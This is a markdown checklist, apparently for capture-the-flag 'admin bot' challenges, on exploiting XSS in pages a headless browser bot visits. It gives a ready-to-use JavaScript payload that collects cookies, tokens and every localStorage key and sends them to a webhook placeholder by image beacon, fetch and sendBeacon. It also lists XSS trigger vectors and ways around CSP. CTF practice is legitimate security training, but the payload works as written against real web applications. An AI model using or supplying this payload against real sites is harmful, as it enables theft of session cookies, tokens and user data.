# Admin Bot / XSS Exfiltration Attack Checklist

## Pre-Flight
- [ ] Set up a webhook receiver (https://webhook.site, pipedream, or VPS)
- [ ] Verify webhook is reachable from the target (or use DNS exfiltration)
- [ ] Prepare payload with multiple exfiltration methods

## Reconnaissance

### 1. Understand the Bot
- [ ] What triggers the bot? (API endpoint, form submission, automatic?)
- [ ] Is authentication required to trigger the bot?
- [ ] What does the bot do? (login, view page, click button, etc.)
- [ ] What pages does the bot visit? List ALL URLs in order.
- [ ] Where is the flag stored? (localStorage, cookie, DOM, JS variable?)
- [ ] What browser/bot framework is used? (Playwright, Puppeteer, Selenium?)

### 2. Map Bot Navigation Flow
```
Bot starts → [Page 1] → [Page 2] → ... → [Page N] → Bot ends
```
For each page transition:
- [ ] What triggers the navigation? (click, redirect, form submit?)
- [ ] Can we influence the navigation target?
- [ ] Are there any user-controlled parameters in the URL?

### 3. Find XSS Vectors
For each page the bot visits:
- [ ] Is there any `innerHTML` with user-controlled data?
- [ ] Are there any `eval()` / `Function()` calls?
- [ ] Are there URL parameters reflected in the DOM?
- [ ] Is there stored user content that gets rendered?
- [ ] Are there any DOM clobbering opportunities?
- [ ] Is there script loaded from user-controlled sources?

### 4. Check Content Security Policy (CSP)
- [ ] `script-src` - can we execute scripts?
- [ ] `connect-src` - can we make fetch/XHR requests?
- [ ] `img-src` - can we load external images? (image beacon)
- [ ] `default-src` - fallback for all directives

## Exploit Construction

### XSS Payload Template
```javascript
(function(){
    // Collect all sensitive data
    var data = {
        flag: localStorage.getItem('flag'),
        cookies: document.cookie,
        token: localStorage.getItem('token'),
        url: location.href,
        allStorage: {}
    };
    for(var i=0; i<localStorage.length; i++){
        var k = localStorage.key(i);
        data.allStorage[k] = localStorage.getItem(k);
    }
    
    // Try multiple exfiltration methods
    var payload = encodeURIComponent(JSON.stringify(data));
    
    // Method 1: Image beacon (most reliable, bypasses CSP connect-src)
    new Image().src = 'WEBHOOK?d=' + payload;
    
    // Method 2: Fetch (if CSP allows)
    try { fetch('WEBHOOK?d=' + payload); } catch(e) {}
    
    // Method 3: navigator.sendBeacon (works even on page unload)
    try { navigator.sendBeacon('WEBHOOK', JSON.stringify(data)); } catch(e) {}
})();
```

### XSS Trigger Methods (try in order)
1. `<img src=x onerror="JS_CODE">` - Works in most contexts
2. `<svg onload="JS_CODE">` - Works when quotes are filtered
3. `<body onload="JS_CODE">` - Works in full HTML context
4. `<iframe srcdoc="<script>JS_CODE</script>">` - Works with iframe srcdoc
5. `<details open ontoggle="JS_CODE">` - Works with `open` attribute

### Shadow DOM Escape
If the XSS fires inside a shadow DOM:
- Scripts have FULL access to `window`, `document`, `localStorage`
- Shadow DOM does NOT provide security isolation
- Standard XSS payloads work unchanged

## Common Pitfalls

### ❌ Don't Do This
- Don't use `alert()` - the bot doesn't see alerts
- Don't use `document.location = ...` unless it's the last resort (navigates away)
- Don't assume `fetch()` works (CSP might block it)
- Don't use `XMLHttpRequest` (same as fetch)
- Don't forget URL encoding on exfiltrated data

### ✅ Do This
- Use image beacon as primary method (rarely blocked)
- Include ALL localStorage keys, not just 'flag'
- Use `encodeURIComponent()` on all exfiltrated data
- Add error handling so one failure doesn't stop others
- Add a unique ID/timestamp to track which payload fired

## Post-Exploitation
- [ ] Check webhook logs for the flag
- [ ] If no flag, check that the payload fired (add a heartbeat ping)
- [ ] Verify the bot actually ran (check for side effects)
- [ ] Try different XSS vectors if one didn't work
